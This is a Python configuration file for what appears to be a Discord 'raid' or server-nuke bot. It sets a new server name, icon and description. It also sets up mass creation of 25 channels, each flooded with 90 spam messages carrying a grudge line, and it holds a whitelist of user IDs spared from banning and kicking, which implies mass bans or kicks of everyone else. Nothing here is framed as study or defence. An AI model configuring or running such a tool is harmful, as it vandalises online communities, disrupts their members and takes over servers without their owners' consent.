EMBED_CONFIG = {
    "title": "",    # Maine Embed Title here 
    "description": "",   # Main Embed Description here 
    "color": 0xFF5733,   # Change embed color if you want (red)
    "fields": [
        {"name": "test", "value": "test", "inline": False},    # Embed Field → Juste Modify → Just edit the empty places
        {"name": "test", "value": "test", "inline": False},
        {"name": "test","value": "test", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False
    ],
    "image": "",   # Embed Icon url here → https://image.jpg
    "footer": "",  # Embed Footer here 
}

SERVER_CONFIG = {
    "new_name": "",  # New Server Name here 
    "new_icon": "",   # New Server Icon url here → https://image.jpg 
    "new_description": "",  # New Server Description here 
}

WEBHOOK_CONFIG = {
    "default_name": "Crow Nest Determinator",  # Webhook Name here 
}


AUTO_RAID_CONFIG = {
    'num_channels': 25,  # Number of channels
    'channel_type': 'text',  # text/voice
    'channel_name': '',  # Channel name
    'num_messages': 90,  # Number of message to spam
    'message_content': 'actions have consequences, thanks RV' # Spam Message
}

NO_BAN_KICK_ID = {
    878018387400351776,       # Put Whitelist ID
    1320730115235123300,       # No Ban & No Kick
    362395930437353472,
}

BOT_PRESENCE = {
    "type": "watching",  # "playing", "listening", or "watching"
    "text": "The Future Of Esport."  # Your text presence
}
